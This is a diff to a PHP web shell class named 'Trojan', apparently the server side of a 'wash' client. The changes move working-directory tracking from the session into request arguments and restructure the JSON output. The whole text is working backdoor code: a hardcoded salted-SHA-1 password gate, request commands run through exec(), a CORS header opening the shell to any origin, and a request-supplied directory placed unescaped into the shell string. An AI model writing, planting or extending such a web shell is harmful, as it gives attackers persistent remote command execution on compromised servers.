@@ -4,6 +4,7 @@ class Trojan{
     private $cwd      = '';
     private $response = array(
         /*
+        'cwd'            => null,
         'error'          => null,
         'output'         => null,
         'prompt_context' => null,
@@ -13,9 +14,9 @@ class Trojan{
     /**
      * A generic constructor
      */
-    public function __construct(){
+    public function __construct($request){
         # emulate cwd persistence
-        $this->cwd = (isset($_SESSION['cwd'])) ? $_SESSION['cwd'] : trim(`pwd`);
+        $this->cwd = ($request['args']['cwd'] != '') ? $request['args']['cwd'] : trim(`pwd`);
     }
 
     /**
@@ -27,7 +28,7 @@ class Trojan{
         # if the specified action was 'shell', pipe the command directly into
         # the web shell.
         if($json['action'] == 'shell'){
-            $this->process_shell_command($json['cmd']);
+            $this->process_shell_command($json['args']['cmd']);
         }
 
         # otherwise, simply invoke the method directly
@@ -55,8 +56,8 @@ class Trojan{
         exec("cd {$this->cwd}; $command 2>&1; pwd", $output_raw);
 
         # buffer the results
-        $_SESSION['cwd']          = $this->cwd = array_pop($output_raw);
-        $this->response['output'] = join($output_raw, "\n");
+        $this->response['output']['cwd']    = $this->cwd = array_pop($output_raw);
+        $this->response['output']['stdout'] = join($output_raw, "\n");
 
         # send the response
         $this->send_response();
@@ -68,7 +69,7 @@ class Trojan{
     private function send_response(){
         /* This header prevents the wash client from malfunctioning due to the 
          * Same-Origin Policy. @see: http://enable-cors.org/ */
-        $this->response['prompt_context'] = $this->get_prompt_context();
+        $this->response['output']['prompt'] = $this->get_prompt_context();
         header('Access-Control-Allow-Origin: *');
 
         # assemble and send a JSON-encoded response
@@ -93,8 +94,7 @@ class Trojan{
 
 # only process the command if a valid password has been specified
 if(sha1($_REQUEST['args']['password'] . 'c5e5f704ee') == '003da5748a1cdeac275548be9741cb35b76f773d'){ 
-    session_start();
-    $trojan = new Trojan();
+    $trojan = new Trojan($_REQUEST);
     $trojan->process_command($_REQUEST);
 }
 
